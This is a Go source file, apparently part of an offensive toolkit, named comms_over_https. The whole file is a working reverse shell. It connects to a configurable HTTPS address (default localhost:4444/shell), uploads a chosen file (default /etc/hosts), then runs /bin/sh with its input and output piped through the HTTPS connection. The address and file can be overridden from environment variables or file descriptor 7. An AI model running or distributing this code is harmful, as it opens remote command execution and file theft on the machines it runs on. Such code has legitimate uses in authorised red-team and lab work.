// Program comms_over_https - coms_over_tls but uses HTTPS
package main

/*
 * comms_over_https.go
 * Like comms_over_tls but with HTTPS
 * By J. Stuart McMurray
 * Created 20240905
 * Last Modified 20240906
 */

import (
	"cmp"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"syscall"
)

// Compile-time configurables
var (
	Address       = "https://localhost:4444/shell"
	AddressEnvVar = "ALPT4ATS_ADDRESS"
	File          = "/etc/hosts"
	FileEnvVar    = "ALPT4ATS_FILE"
)

// ConfFD is the file descriptor from which we might read our config.
const ConfFD = 7

func main() {
	/* Config from environment overrides compile-time config. */
	Address = cmp.Or(os.Getenv(AddressEnvVar), Address)
	File = cmp.Or(os.Getenv(FileEnvVar), File)

	/* Config from file descriptor 7 overrides config from environment. */
	if _, err := fmt.Fscan(
		os.NewFile(uintptr(ConfFD), "config"),
		&Address,
		&File,
	); nil != err && !errors.Is(err, io.EOF) &&
		!errors.Is(err, syscall.EBADF) {
		log.Fatalf("Error reading config from FD %d: %s", ConfFD, err)
	}

	/* Connect to the server. */
	pr, pw := io.Pipe()
	res, err := http.Post(Address, "", pr)
	if nil != err {
		log.Fatalf("HTTPS request error: %s", err)
	}

	/* Send back the file. */
	b, err := os.ReadFile(File)
	if nil != err {
		log.Fatalf("Error reading file: %s", err)
	}
	if _, err := pw.Write(b); nil != err {
		log.Printf("Error sending file: %s", err)
	}

	/* Spawn a shell. */
	sh := exec.Command("/bin/sh")
	sh.Stdin = res.Body
	sh.Stdout = pw
	sh.Stderr = pw
	if err := sh.Run(); nil != err {
		log.Fatalf("Shell died: %s", err)
	}
}
